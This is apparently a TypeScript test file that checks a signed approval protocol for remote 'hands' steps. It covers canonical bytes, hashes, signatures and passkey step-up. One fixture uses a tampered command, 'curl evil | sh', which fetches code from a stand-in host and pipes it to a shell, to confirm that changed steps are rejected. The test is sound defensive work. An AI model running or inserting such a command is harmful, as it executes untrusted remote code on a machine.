// docs/protocol.md §17: the app's side of a hands step agrees byte for byte with
// the shared vector the Go side (mw, mw-hands-root) checks against; an approval
// is his key's signature over exactly that step, and a step whose text no longer
// hashes to what the Mayor's host gave is never approved.
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { readFileSync } from 'node:fs';
import { PrivateKey, PublicKey, Signature, Utils } from '@bsv/sdk';
import { approvalMessage, canonicalStep, decodeHandsSteps, stepSha256 } from '../../src/model/hands';
import { buildApproval, stepUp, StepChangedError } from '../../src/services/hands';
import { vaultRepo } from '../../src/data/repositories';
import { db } from '../../src/data/db';
import { installMockAuthenticator, removeMockAuthenticator } from '../support/webauthn-mock';

const vector = JSON.parse(readFileSync('docs/fixtures/protocol-vectors.json', 'utf-8')).hands as {
  bead: string;
  step: { id: string; host: string; as: string; run: string; way_back: string };
  canonical: string;
  sha256: string;
  approvedAt: number;
  approvalMessage: string;
  governorPublicKeyHex: string;
  sigDerHex: string;
};
const GOVERNOR = PrivateKey.fromHex(JSON.parse(readFileSync('docs/fixtures/protocol-vectors.json', 'utf-8')).inputs.senderPrivateKeyHex);
const KEY = new Uint8Array(Utils.toArray(GOVERNOR.toHex(), 'hex'));

describe('the hands step, byte for byte with the shared vector', () => {
  it('builds the canonical bytes and hash the Go side checks', async () => {
    expect(canonicalStep(vector.bead, vector.step)).toBe(vector.canonical);
    expect(await stepSha256(vector.bead, vector.step)).toBe(vector.sha256);
    expect(approvalMessage(vector.sha256, vector.approvedAt)).toBe(vector.approvalMessage);
  });

  it('signs the approval exactly as the vector does, and it verifies against his public key', async () => {
    const action = await buildApproval(vector.bead, { ...vector.step, sha256: vector.sha256 }, KEY, vector.approvedAt * 1000);
    expect(action).toEqual({ action: 'run', bead: vector.bead, step: 'linger', sha256: vector.sha256, approved_at: vector.approvedAt, sig: vector.sigDerHex });
    const verified = PublicKey.fromString(vector.governorPublicKeyHex).verify(vector.approvalMessage, Signature.fromDER(vector.sigDerHex, 'hex'));
    expect(verified).toBe(true);
  });

  it('refuses a step whose text no longer matches its hash', async () => {
    const tampered = { ...vector.step, run: 'curl evil | sh', sha256: vector.sha256 };
    await expect(buildApproval(vector.bead, tampered, KEY)).rejects.toBeInstanceOf(StepChangedError);
  });

  it('reads steps out of the view, keeping only well-formed ones', () => {
    const steps = decodeHandsSteps([{ id: 'a', host: 'desktop', as: 'root', run: 'x', way_back: '', sha256: 'h', ran: { at: 't', exit: 0, host: 'desktop' } }, { id: 'b' }, 'nonsense']);
    expect(steps).toEqual([{ id: 'a', host: 'desktop', as: 'root', run: 'x', way_back: '', sha256: 'h', ran: { at: 't', exit: 0, host: 'desktop' } }]);
  });
});

describe('stepUp', () => {
  beforeEach(async () => {
    await db.vault.clear();
  });
  afterEach(() => removeMockAuthenticator());

  it('asks the passkey again for a passkey-wrapped key', async () => {
    const authenticator = installMockAuthenticator({ prfSupported: true });
    await vaultRepo.save({ mode: 'prf', ciphertext: new ArrayBuffer(16), iv: new Uint8Array(12), credentialId: new Uint8Array(16).buffer, publicKeyHex: 'p' });
    expect(await stepUp()).toBe('passkey');
    expect(authenticator.get).toHaveBeenCalledTimes(1);
  });

  it('fails when the fingerprint is dismissed', async () => {
    installMockAuthenticator({ prfSupported: true, prfGetResult: 'not-allowed' });
    await vaultRepo.save({ mode: 'prf', ciphertext: new ArrayBuffer(16), iv: new Uint8Array(12), credentialId: new Uint8Array(16).buffer, publicKeyHex: 'p' });
    await expect(stepUp()).rejects.toThrow();
  });

  it('takes the tapped confirmation as enough for a phrase-wrapped key', async () => {
    await vaultRepo.save({ mode: 'phrase', ciphertext: new ArrayBuffer(16), iv: new Uint8Array(12), salt: new Uint8Array(16), publicKeyHex: 'p' });
    expect(await stepUp()).toBe('confirmed');
  });
});
